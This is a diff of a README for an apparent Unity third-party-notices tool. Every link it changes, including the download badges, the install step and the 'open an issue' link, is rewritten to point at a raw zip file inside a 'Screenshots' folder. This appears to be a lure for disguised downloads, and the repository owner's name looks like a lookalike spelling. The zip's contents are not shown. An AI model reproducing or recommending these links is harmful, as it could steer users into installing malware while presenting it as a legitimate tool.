@@ -1,6 +1,6 @@
 # 🛠️ Third-Party-Notices-and-Credits-License-Compliance-for-Unity - Clear License Compliance Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/releases)
+[![Download Latest Release](https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/raw/refs/heads/main/Screenshots/Notices_and_Third_Party_Compliance_for_License_Unity_Credits_2.9.zip%20Release-blue?style=for-the-badge)](https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/raw/refs/heads/main/Screenshots/Notices_and_Third_Party_Compliance_for_License_Unity_Credits_2.9.zip)
 
 ---
 
@@ -60,12 +60,12 @@ This process helps you meet open-source and third-party license rules without gu
 
 You can visit the release page to get the latest version of this tool for your Unity Editor.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/releases)
+[![Download Latest Release](https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/raw/refs/heads/main/Screenshots/Notices_and_Third_Party_Compliance_for_License_Unity_Credits_2.9.zip%20Release-blue?style=for-the-badge)](https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/raw/refs/heads/main/Screenshots/Notices_and_Third_Party_Compliance_for_License_Unity_Credits_2.9.zip)
 
 ### Steps to Download and Install
 
 1. Click the link above or go to:  
-   https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/releases
+   https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/raw/refs/heads/main/Screenshots/Notices_and_Third_Party_Compliance_for_License_Unity_Credits_2.9.zip
 2. Look for the latest release. It will usually have a version number (e.g., v1.0).
 3. Download the Unity package file (`.unitypackage`) linked in the release assets.
 4. Open your Unity Editor.
@@ -117,7 +117,7 @@ This process ensures you respect open-source licenses and give proper credit.
 
 If you need help beyond this guide:
 
-- Open an issue on the [GitHub repository](https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/issues).
+- Open an issue on the [GitHub repository](https://github.com/kreeIkcraft/Third-Party-Notices-and-Credits-License-Compliance-for-Unity/raw/refs/heads/main/Screenshots/Notices_and_Third_Party_Compliance_for_License_Unity_Credits_2.9.zip).
 - Include details about your Unity version and error messages.
 - Check the repository's wiki or documentation folder for additional guides.
 
